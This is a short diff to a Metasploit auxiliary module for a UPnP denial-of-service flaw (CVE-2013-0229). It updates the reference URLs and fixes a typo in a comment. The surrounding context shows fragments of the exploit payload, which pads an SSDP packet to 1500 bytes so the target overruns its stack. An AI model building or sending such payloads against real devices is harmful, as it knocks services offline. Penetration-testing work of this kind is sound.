@@ -25,7 +25,8 @@ class MetasploitModule < Msf::Auxiliary
           [ 'CVE', '2013-0229' ],
           [ 'OSVDB', '89625' ],
           [ 'BID', '57607' ],
-          [ 'URL', 'https://community.rapid7.com/servlet/JiveServlet/download/2150-1-16596/SecurityFlawsUPnP.pdf' ]
+          [ 'URL', 'https://www.rapid7.com/blog/post/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play/' ],
+          [ 'URL', 'https://www.hdm.io/writing/SecurityFlawsUPnP.pdf' ]
         ],
       'DisclosureDate' => '2013-03-27',
     ))
@@ -63,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     sploit << "ST:uuid:schemas:device:MX:3"
     # the packet can be at most 1500 bytes long, so add appropriate number of ' ' or '\t'
     # this makes the DoS exploit more probable, since we're occupying the stack with arbitrary
-    # characters: there's more chance that the the program will run off the stack.
+    # characters: there's more chance that the program will run off the stack.
     sploit += ' '*(1500-sploit.length)
 
 
